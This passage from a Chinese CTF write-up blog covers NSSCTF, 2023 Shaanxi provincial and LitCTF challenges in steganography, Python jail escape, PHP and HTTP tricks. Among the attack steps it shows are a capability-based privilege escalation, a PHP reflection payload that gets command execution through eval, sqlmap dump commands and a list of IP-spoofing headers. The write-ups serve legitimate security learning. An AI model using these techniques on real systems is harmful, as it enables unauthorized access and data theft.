    while png_start != -1:            # 找到PNG图片的结束位置            png_end = file_data.find(b&#39;\x49\x45\x4E\x44\xAE\x42\x60\x82&#39;, png_start)            if png_end != -1:                # 提取PNG图片的数据                png_data = file_data[png_start:png_end + 8]                # 保存PNG图片                output_file_path = os.path.splitext(file_path)[0] + &#39;.png&#39;                with open(output_file_path, &#39;wb&#39;) as output_file:                    output_file.write(png_data)                print(f&#39;Saved PNG image from &#123;file_path&#125; to &#123;output_file_path&#125;&#39;)                # 继续查找下一个PNG图片的起始位置                png_start = file_data.find(b&#39;\x89\x50\x4E\x47\x0D\x0A\x1A\x0A&#39;, png_end)            else:                break# 存放这44个文件的文件夹路径folder_path = &#39;E:/Desktop/nss misc专项/奇怪的tex文件/Tex&#39;extract_png_from_folder(folder_path)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604095535749.png" alt="image-20230604095535749"></p><p>最后将字符进行拼接得到flag <strong>:horse:NSSCTF{fine!it_1s_ez_f0rU_a_MISCmaster_todo}</strong></p><h2 id="strange-python-jail-沙箱逃逸"><a href="#strange-python-jail-沙箱逃逸" class="headerlink" title="strange python (jail 沙箱逃逸)"></a>strange python (jail 沙箱逃逸)</h2><p>拿到一个python shell</p><p>首先dir()查看shell的内置变量 看到<code>__flag__</code> random seed shuffle</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604204936922.png" alt="image-20230604204936922"></p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><code>__flag__</code>应该是flag按照seed确定的顺序 使用shuffle函数进行了乱序  那么可以 <strong>伪随机预测+列表伪随机打乱后还原</strong></p><pre><code class="python">import randomimport re__flag__ = [&#39;a6&#39;, &#39;5f&#39;, &#39;70&#39;, &#39;SC&#39;, &#39;-4&#39;, &#39;7-&#39;, &#39;3d&#39;, &#39;7e&#39;, &#39;a2&#39;, &#39;NS&#39;, &#39;b4&#39;, &#39;f6&#39;, &#39;6&#125;&#39;, &#39;TF&#39;, &#39;-7&#39;, &#39;1a&#39;, &#39;22&#39;, &#39;06&#39;, &#39;c0&#39;, &#39;c5&#39;, &#39;&#123;4&#39;, &#39;0-&#39;]seed = 114514b = []for i in range(22):    b.append(i)print(b)random.seed(seed)random.shuffle(b)print(b)for i in range(22):    print(__flag__[b.index(i)], end=&quot;&quot;)# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21]# [18, 19, 20, 1, 10, 12, 14, 17, 4, 0, 13, 11, 21, 2, 15, 8, 9, 16, 5, 6, 3, 7]# NSSCTF&#123;4a2c0c50-1a22-4f67-b43d-7067ea65f706&#125;</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>利用python的特殊权限态进行文件读取</strong></p><p>先通过python得到一个交互式的shell</p><pre><code class="python">&gt;&gt;&gt; import pty;pty.spawn(&quot;/bin/bash&quot;)import pty;pty.spawn(&quot;/bin/bash&quot;)ctf@61d8d57653564e1a:/$</code></pre><p>通过资料，可以得知在python启动交互式终端的时候，会读取<code>PYTHONSTARTUP</code>这一环境变量作为shell启动时的预先加载脚本，那么说明<code>__flag__</code>的加载逻辑肯定在预先加载脚本内：</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604210108219.png" alt="image-20230604210108219"></p><p>但是在读取这个文件的时候 发现需要root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604210256502.png" alt="image-20230604210256502"></p><p>但是python可以读取 因为发现该题目中python有特殊权限</p><pre><code>ctf@61d8d57653564e1a:/$ getcap -r / 2&gt;/dev/null  /usr/bin/python3.10 cap_dac_override=ep</code></pre><p>所以可以用python直接进行脚本读取</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604210502189.png" alt="image-20230604210502189"></p><p><strong>:horse:NSSCTF{4a2c0c50-1a22-4f67-b43d-7067ea65f706}</strong></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p><strong>了解一下import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)</strong></p><p>pty.spawn用于创建一个伪终端环境 或者说交互式的终端环境  用于执行命令行程序或模拟终端用户与其他程序进行交互的场景。</p><p>该函数运行了&#x2F;bin&#x2F;bash 命令 可以进入一个新的bash shell环境 可以在其中执行命令 与其交互</p><p><strong>env：在linux系统中用来显示当前用户的变量 即环境变量</strong></p><p><font color="red"> getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</font>该命令可以查看linux系统中所有存在特殊权限(capabilities)的文件</p><h2 id="ability-jail-沙箱逃逸"><a href="#ability-jail-沙箱逃逸" class="headerlink" title="ability(jail 沙箱逃逸)"></a>ability(jail 沙箱逃逸)</h2><p>题目提示和linux中的特权(capabilities)有关</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604212459122.png" alt="image-20230604212459122"></p><p>想查看flag 但发现没有权限  开始寻找该linux在什么文件中设置了特权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604212551027.png" alt="image-20230604212551027"></p><p>于是使用dig程序 无视文件的权限设置 读取flag 在读取过程中 会将flag的内容一起读出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604212924138.png" alt="image-20230604212924138"></p><p><strong>:horse:NSSCTF{d4ff2964-dd1b-453d-a2d3-d00a85ee68cd}</strong></p><h3 id="dig程序"><a href="#dig程序" class="headerlink" title="dig程序"></a>dig程序</h3><p>在 Linux 系统中，<code>dig</code> 是一个常用的命令行工具，用于执行 <strong>DNS（Domain Name System）查询</strong> 从DNS服务器中获取域名等相关信息。</p><p>具体来说，<code>dig</code> 的作用如下：</p><ol><li>DNS 查询：<code>dig</code> 命令用于执行 DNS 查询，包括查找域名的 IP 地址、反向查找 IP 地址的域名、获取 DNS 记录等。</li><li>命令行界面：<code>dig</code> 提供了一个命令行界面，使用户可以直接在终端中输入命令并获取 DNS 查询结果。</li><li>支持多种查询类型：<code>dig</code> 支持多种 DNS 查询类型，如 A、AAAA、CNAME、MX、TXT、NS、PTR 等，可根据需求执行不同类型的查询。</li><li>详细信息输出：<code>dig</code> 在执行查询时，会输出详细的信息，包括查询结果、响应时间、查询状态等，便于用户进行分析和调试。</li></ol><p>在 <code>dig</code> 命令中，**<code>-f</code>** 选项用于指定包含要查询的域名列表的文件。</p><p>具体来说，<code>-f</code> 选项的含义如下：</p><ul><li><code>-f &lt;filename&gt;</code>: 指定包含要<strong>查询的域名列表的文件名</strong>。<strong>该文件应该是一个文本文件</strong>，每行包含一个域名，<code>dig</code> 命令将逐行读取该文件并对每个域名执行查询操作。使用 <code>-f</code> 选项可以方便地对多个域名进行批量查询，而不需要手动输入每个域名。这在一次性查询多个域名的情况下特别有用，例如从文件中读取要查询的域名列表。</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年陕西省赛</title>
      <link href="/2023/06/03/2023%E5%B9%B4%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/"/>
      <url>/2023/06/03/2023%E5%B9%B4%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2023年陕西省赛"><a href="#2023年陕西省赛" class="headerlink" title="2023年陕西省赛"></a>2023年陕西省赛</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>先看题目提示 是lsb 直接使用stegsolve进行信息提取</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603093430165.png" alt="image-20230603093430165"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603093447923.png" alt="image-20230603093447923"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603093506785.png" alt="image-20230603093506785"></p><p>虽然图片阴影比较多 但还是可以在red green blue的0通道上看到明显的痕迹 说明这三个通道上都有信息隐藏</p><p>但其实三个通道上信息都是一样的 都是正确的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603093623882.png" alt="image-20230603093623882"></p><p><strong>:horse:flag{0988f2a657d8936a76876d4f39f7d7a0}</strong></p><h3 id="可是雪啊飘进双眼-snow隐写"><a href="#可是雪啊飘进双眼-snow隐写" class="headerlink" title="可是雪啊飘进双眼(snow隐写)"></a>可是雪啊飘进双眼(snow隐写)</h3><p>在hint.wav后面发现摩斯电码  解码结果是WOAISHANXI </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606193304876.png" alt="image-20230606193304876"></p><p>将snow.txt放进010editor中观察 发现在行间出现大量可疑空格 且重复出现16进制码的20 09</p><p>考虑<strong>snow隐写</strong>  WOAISHANXI应该是密码</p><pre><code>snow隐写是由空格、制表符、回车等不可见字符组成的隐写原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606194753343.png" alt="image-20230606194753343"></p><p>得到<code>shanxiroujiamo</code> 为压缩包密码 得到hide.jpg和key.jpg</p><p>binwalk分离key.jpg得到2.jpg 对比key.jpg 得到解密内容为：BC1PVEYD</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606200018725.png" alt="image-20230606200018725"></p><p><strong>flag{d2d2835882495f4e39ecce6847e78f86}</strong></p><h3 id="findme-crc块异常-vc容器加密-gimp查看图片"><a href="#findme-crc块异常-vc容器加密-gimp查看图片" class="headerlink" title="findme(crc块异常 vc容器加密 gimp查看图片)"></a>findme(crc块异常 vc容器加密 gimp查看图片)</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606211521662.png" alt="image-20230606211521662"></p><p>在图片下方 观察到明显的异常色块  在010editor打开 发现了crc块有问题 </p><p>使用tweakpng工具 先导出异常部分 再删去 保存图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230611090854614.png" alt="image-20230611090854614"></p><p><font color="red">删掉unknow1前面这部分IDAT头</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230611091057859.png" alt="image-20230611091057859"></p><p>得到 unkonwn和key_修正.png</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606211856015.png" alt="image-20230606211856015"></p><p>整数大小 猜测是vc容器 使用key_修正.png做密钥进行挂载  得到flag.txt   全是0和255</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606212008217.png" alt="image-20230606212008217"></p><pre><code class="python">with open(&#39;E:/Desktop/2023 陕西省赛/find/flag/flag.txt&#39;, &#39;r&#39;) as file:    data = file.read()hex_data = &#39;&#39;.join([hex(int(value))[2:].zfill(2) for value in data.split(&#39;,&#39;)])print(hex_data)with open(&#39;flag_hex.txt&#39;, &#39;w&#39;) as f:    f.write(bytes.fromhex(hex_data))</code></pre><p>转化为16进制 将文件的后缀改为.data 放进gimps 转化为二维码 手动扫一下  <font color="red">注意 最后的结果编码一定要是ascii 不能是utf-8 不然转出来的二维码会有问题</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230611093527975.png" alt="image-20230611093527975"></p><p><strong>:horse:flag{a95e34a30d135c2d32f46f3834872f37}</strong></p><h3 id="你是不是很疑惑呢-aztec条形码"><a href="#你是不是很疑惑呢-aztec条形码" class="headerlink" title="你是不是很疑惑呢(aztec条形码)"></a>你是不是很疑惑呢(aztec条形码)</h3><p>这39张码都是一样的<img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606222427342.png" alt="image-20230606222427342"></p><p><strong>aztec码</strong> 找个在线工具扫一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606222548677.png" alt="image-20230606222548677"></p><p><a href="https://products.aspose.app/barcode/zh-hans/recognize/aztec#/recognized">aztec条形码在线阅读</a></p><p><strong>an inch of {TIME} is an inch of gold, an inch of gold cannot buy an inch of {TIME}</strong></p><p>提示在图片的创建时间上有文章</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606222819401.png" alt="image-20230606222819401"></p><p><strong>日期转时间戳再异或 将异或的结果按ascii码转为字符</strong></p><pre><code class="python">import osimport redef chinese_to_arabic(chinese_number):    mapping = &#123;        &#39;零&#39;: 0,        &#39;壹&#39;: 1,        &#39;贰&#39;: 2,        &#39;叁&#39;: 3,        &#39;肆&#39;: 4,        &#39;伍&#39;: 5,        &#39;陆&#39;: 6,        &#39;柒&#39;: 7,        &#39;捌&#39;: 8,        &#39;玖&#39;: 9,        &#39;拾&#39;: 10,    &#125;    pattern = re.compile(r&#39;[零壹贰叁肆伍陆柒捌玖拾佰仟万亿]&#39;)    matches = pattern.findall(chinese_number)    total = 0    current = 0    for char in matches:        value = mapping[char]        if value &gt;= 10:            if current == 0:                current = value            else:                current *= value        else:            current += value            if current &gt;= 10:                total += current                current = 0    return total + current# 获取当前目录路径folder_path = &#39;E:/Desktop/2023 陕西省赛/out/out&#39;# 获取当前目录下的所有文件名file_names = os.listdir(folder_path)# print(file_names)# 仅保留后缀为 .png 的文件名，并将中文数字转换为阿拉伯数字number_file_mapping = &#123;&#125;for filename in file_names:    if filename.endswith(&#39;.png&#39;):        chinese_num = filename.split(&#39;.&#39;)[0]        number = chinese_to_arabic(chinese_num)        number_file_mapping[number] = filename# 按数字的大小顺序遍历文件名sorted_numbers = sorted(number_file_mapping.keys())for number in sorted_numbers:    filename = number_file_mapping[number]    file_path = os.path.join(folder_path, filename)    # 获取文件的创建时间和修改时间的时间戳    create_time = int(os.path.getctime(file_path))    modify_time = int(os.path.getmtime(file_path))    # 异或运算    xor_result = create_time ^ modify_time    xor_result = xor_result % 0x110000    print(chr(xor_result),end=&#39;&#39;)# flag&#123;Tim3_1s_a_w0nd3rfuL_Th1ng_alright&#125;</code></pre><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><h3 id="被销毁的flag"><a href="#被销毁的flag" class="headerlink" title="被销毁的flag"></a>被销毁的flag</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606222936551.png" alt="image-20230606222936551"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606223001126.png" alt="image-20230606223001126"></p><p>发现destroy 即为被删除的部分</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606223101100.png" alt="image-20230606223101100"></p><p>点开method为destroy的部分  在detail里面没有有效信息</p><p>再点开下面的部分 在detail里面找到一串hex码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606223249791.png" alt="image-20230606223249791"></p><p>使用utf-8的编码方式 发现flag  在进行一下拼接 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606223356008.png" alt="image-20230606223356008"></p><p><strong>flag{S0met1m4s_d4t0ry_c4n_n0t_d4t0ry}</strong></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="unserialize-反射机制-unicode不可见字符"><a href="#unserialize-反射机制-unicode不可见字符" class="headerlink" title="unserialize(反射机制 unicode不可见字符 )"></a>unserialize(反射机制 unicode不可见字符 )</h3><p>题目代码</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-type:text/html;charset=utf-8&quot;);require_once &quot;waf.php&quot;;error_reporting(0);class getFlag&#123;    private $password;    private $cmd;    public function __destruct()&#123;        if($this-&gt;password==&quot;‮⁦  //how to change the private variables⁩⁦secret&quot;)&#123;            system($this-&gt;cmd);        &#125;    &#125;&#125;$a = $_GET[&#39;a&#39;];if(isset($_GET[&#39;a&#39;]))&#123;    @eval(waf($a));&#125;?&gt;</code></pre><p>使用dirsearch扫出robots.txt</p><pre><code class="python"> python dirsearch.py -e php -u http://f74888d8.clsadp.com/</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230612162333204.png" alt="image-20230612162333204"></p><p>转到 hint.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230612162441417.png" alt="image-20230612162441417"></p><p>得到提示<code>you can use these(getProperty、ReflectionObject、getFlag、getProperty、setAccessible、setValue)function</code></p><pre><code>这行代码使用require_once语句导入了一个名为&quot;waf.php&quot;的文件 waf.php很可能包含一些用与过滤和检查输出的代码 当类getFlag被创建的时候，在触发销毁函数的时候，经过if判断，判断成功可以执行cmd命令，但是password和cmd是private私有变量，发现eval函数，传入参数a，a传递的php代码可以被执行 结合题意和提示 waf.php是用于检测a传入的php代码是否只使用了提示包含的函数 @符号用于抑制可能产生的错误消息。</code></pre><p><font color="red">可以利用反射机制来绕过私有成员变量的访问限制</font></p><p>编写exp</p><pre><code>$flag=new getFlag();$reflection = new ReflectionObject($flag);$property = $reflection-&gt;getProperty(&#39;password&#39;);$property-&gt;setAccessible(true);$property-&gt;setValue($flag, &quot;‮⁦  //how to change the private variables⁩⁦secret&quot;);$property = $reflection-&gt;getProperty(&#39;cmd&#39;);$property-&gt;setAccessible(true);$property-&gt;setValue($flag, &quot;cat flag&quot;);</code></pre><p>放在vscode中还能看到不可见字符(unicode)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230612200327300.png" alt="image-20230612200327300"></p><p>将exp作为a的内容以get方式传入 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230612202606059.png" alt="image-20230612202606059"></p><p><strong>flag{5e711db64425e99fcaf6020a8a3c9afb}</strong></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF一些题解</title>
      <link href="/2023/05/19/LitCTF%E4%B8%80%E4%BA%9B%E9%A2%98%E8%A7%A3/"/>
      <url>/2023/05/19/LitCTF%E4%B8%80%E4%BA%9B%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="LitCTF一些题解"><a href="#LitCTF一些题解" class="headerlink" title="LitCTF一些题解"></a>LitCTF一些题解</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h3><p>F12 在源代码中找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519155006089.png" alt="image-20230519155006089"></p><p><strong>NSSCTF{y0u_w1n_th1s_!!!}</strong></p><h3 id="我Flag呢？"><a href="#我Flag呢？" class="headerlink" title="我Flag呢？"></a>我Flag呢？</h3><p>bp使用repeater看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519155501335.png" alt="image-20230519155501335"></p><p><strong>NSSCTF{6ea58035-0f11-4048-ad1d-39be33c5d5c6}</strong></p><p>同时在网站的控制台处可以找到第一个彩蛋</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519155800019.png" alt="image-20230519155800019"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519155809078.png" alt="image-20230519155809078"></p><p><strong>LitCTF{First_t0_The_k3y!</strong></p><h3 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h3><p>简单的hackbar的使用 用post和get方法分别进行传参</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519160049607.png" alt="image-20230519160049607"></p><p><strong>NSSCTF{957f8756-66e3-45d2-9e1c-bcf6dd96c2ee}</strong></p><p>常见的网站备份文件名都试一下</p><p>发现输入<a href="http://www.zip可以进行下载/">www.zip可以进行下载</a> 下载后得到备份文件index.php.bak</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519163046047.png" alt="image-20230519163046047"></p><p>得到第三个彩蛋</p><pre><code>_R3ady_Pl4yer_000ne_</code></pre><h3 id="这是什么？SQL-！注一下-！"><a href="#这是什么？SQL-！注一下-！" class="headerlink" title="这是什么？SQL ！注一下 ！"></a>这是什么？SQL ！注一下 ！</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519165142849.png" alt="image-20230519165142849"></p><p>在网页下方可以看到传入id参数的sql语句</p><p>尝试输入1、2等 直接看到了第四个彩蛋</p><p><strong>F1rst_to_Th3_eggggggggg!}</strong> </p><p>使用sqlmap进行一个梭</p><pre><code class="python">python sqlmap url --dbspython sqlmap url -D ctftraining -T flag -C &quot;flag&quot; --dump</code></pre><p>得到<strong>NSSCTF{9ff959f5-1a7e-484a-8295-225ca817bef1}</strong></p><h3 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h3><p>给了探姬的博客<a href="https://probiusofficial.github.io/">https://ProbiusOfficial.github.io</a></p><p>那就进去看看 第一篇文章就是题目相关的 “什么是flag ”</p><p>那进入github找到探姬存放数据的库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519182641671.png" alt="image-20230519182641671"></p><p>定位到博客的库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524211251005.png" alt="image-20230524211251005"></p><p>点击branch</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519182751017.png" alt="image-20230519182751017"></p><p>发现main分支最近更改过  “什么是flag”这篇文章也是最近发布的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519183002787.png" alt="image-20230519183002787"></p><p>查看commit 一个commit可以认为是一个改动的节点 进入后查看新提交的commit的位置</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519183157172.png" alt="image-20230519183157172"></p><p>在这里有一个红 <font color="red">×</font> 进入后找到“什么是flag呢” 对应的index.html<br><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519183400263.png" alt="image-20230519183400263"></p><p>找到flag：<strong>LitCTF{g1thub_c0mmit_1s_s0_us3ful}</strong></p><h3 id="Http-pro-max-plus"><a href="#Http-pro-max-plus" class="headerlink" title="Http pro max plus"></a>Http pro max plus</h3><p>考察http协议伪造</p><p>首先，显示只允许本地访问</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519191538249.png" alt="image-20230519191538249"></p><p>使用ip地址欺骗的字典 一键全部复制粘贴</p><pre><code>X-Forwarded-For: 127.0.0.1X-Forwarded: 127.0.0.1X-Forwarded-With:127.0.0.1X-Forwarded-Proto:127.0.0.1X-Forwarded-Host:127.0.0.1Forwarded-For: 127.0.0.1Forwarded: 127.0.0.1X-Forwarded-Host: 127.0.0.1X-remote-IP: 127.0.0.1X-remote-addr: 127.0.0.1 True-Client-IP: 127.0.0.1 X-Client-IP: 127.0.0.1Client-IP: 127.0.0.1X-Real-IP: 127.0.0.1Ali-CDN-Real-IP: 127.0.0.1Cdn-Src-Ip: 127.0.0.1Cdn-Real-Ip: 127.0.0.1CF-Connecting-IP: 127.0.0.1X-Cluster-Client-IP: 127.0.0.1 WL-Proxy-Client-IP: 127.0.0.1 Proxy-Client-IP: 127.0.0.1 Fastly-Client-Ip: 127.0.0.1 True-Client-Ip: 127.0.0.1</code></pre><p>第二层 you are not from pornhub.com</p><p>伪造Referer</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519192324761.png" alt="image-20230519192324761"></p><p>第三步 用chrome浏览器啊</p><p>伪造User-Agent</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519192354974.png" alt="image-20230519192354974"></p><p>第四步 修改代理服务器地址</p><p>伪造via</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519192546047.png" alt="image-20230519192546047"></p><p>提示查看&#x2F;wtfwtfwtfwtf.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519193646867.png" alt="image-20230519193646867"></p><p>回显内容并没有用 f12看源代码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519193726024.png" alt="image-20230519193726024"></p><p>转到sejishikong.php</p><p>得到<strong>NSSCTF{6dc39953-2c34-4dde-8217-5a76f14a385f}</strong></p><h4 id="http伪造相关知识"><a href="#http伪造相关知识" class="headerlink" title="http伪造相关知识"></a><strong>http伪造相关知识</strong></h4><p>1.请从本地访问&#x2F;提到ip ip地址欺骗</p><p>2.从什么网址访问 修改Referer</p><p>3.通过什么浏览器访问 修改User-Agent</p><p>4.使用什么代理服务器 修改via</p><p>5.http状态码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519195205508.png" alt="image-20230519195205508"></p><p>6.cookie欺骗 认证 伪造</p><pre><code>cookie机制是在浏览网页的时候，服务器将你的登录信息，浏览信息等发送给客户端并保存一定的时间。当你下一次访问这个网站的时候，就能读取上一次你的记录cookie是一段小型的文本数据是由一个名称（Name）、一个值（Value）和其它几个用于控制Cookie有效期、安全性、使用范围的可选属性组成。我们只要伪造了这个信息就可以绕过登录页面，直接登录。</code></pre><p><strong>HTTP基本认证</strong></p><p>是允许http用户代理在请求的时候 提供用户名和密码的一种方式</p><p>认证过程:</p><p>1.客户端请求</p><p>2.服务端应答 包含字段WWW-Authenticate: Basic realm&#x3D;”Secure Area”  Basic为验证模式 realm&#x3D;”Secure Area”是保护域</p><p>3.客户端输入用户名和密码 进行处理，在原先的请求上增加认证消息头（Authorization）然后重新发送再次尝试。过程如下：</p><ol><li>将用户名和密码拼接为<code>用户：密码</code>形式的字符串。</li><li>如果服务器<code>WWW-Authenticate</code>字段有指定编码，则将字符串编译成对应的编码（如：UTF-8）。</li><li>将字符串编码为base64。</li><li>拼接<code>Basic</code> ，放入<code>Authorization</code>头字段，就像这样：<code>Authorization Basic 字符串</code>。 示例：用户名：<code>Aladdin</code> ，密码：<code>OpenSesame</code> ，拼接后为<code>Aladdin:OpenSesame</code>，编码后<code>QWxhZGRpbjpPcGVuU2VzYW1l</code>，在HTTP头部里会是这样：<code>Authorization: Basic QWxhZGRpbjpPcGVuU2VzYW1l</code></li></ol><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519200031252.png" alt="image-20230519200031252"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519200053714.png" alt="image-20230519200053714"></p><p>由此原理 可以对cookie进行爆破 伪造等操作</p><h3 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h3><p>一句话命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519201416235.png" alt="image-20230519201410989"></p><p><strong>NSSCTF{6eb8d6fb-3f6b-44b8-8698-979458e6df93}</strong></p><h3 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h3><p>登陆页面 admin admin直接过</p><p>在上传文件处找到第二个彩蛋 <strong>_S0_ne3t?</strong></p><p>简单的文件上传</p><p>在上传文件处写入file:&#x2F;&#x2F;&#x2F;flag 上传-继续编辑 就可以看到flag</p><p><strong>NSSCTF{e2a030e7-c7f3-4587-a3b2-ea2243537015}</strong></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="easy-shark"><a href="#easy-shark" class="headerlink" title="easy_shark"></a>easy_shark</h3><p>首先压缩包含有伪加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524090146235.png" alt="image-20230524090146235"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524090158520.png" alt="image-20230524090158520"></p><p>修改后得到一个流量包</p><p>过滤http 在最后一个包中找到flag (前面是一堆fake的flag)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524090915381.png" alt="image-20230524090915381"></p><p>有一个方程组 解为17 和 77  gezx{j13p5oznp_1t_z_900y_k3z771h_k001} 看起来是什么加密</p><p>猜测是<strong>仿射密码</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524091412869.png" alt="image-20230524091412869"></p><pre><code>flag&#123;w13e5hake_1s_a_900d_t3a771c_t001&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524091840267.png" alt="image-20230524091840267"></p><p>在tcp流中可以找到上传了一句话木马文件</p><p>所以木马的key就是a</p><pre><code>flag&#123;w13e5hake_1s_a_900d_t3a771c_t001_a&#125;</code></pre><h3 id="两仪生四象"><a href="#两仪生四象" class="headerlink" title="两仪生四象"></a>两仪生四象</h3><p>拿到加密脚本 </p><p>其实现的过程是：截取了flag中大括号内的内容 将其每个字符转化为10个二进制字符 再将他们一起拼接到binary_text文件中 将binary_text文件中 每三位二进制字符 对应_reverse_hash表中的数字与卦象进行转换 保存在encode_text中 最后对其进行输出</p><pre><code class="python">_hash = 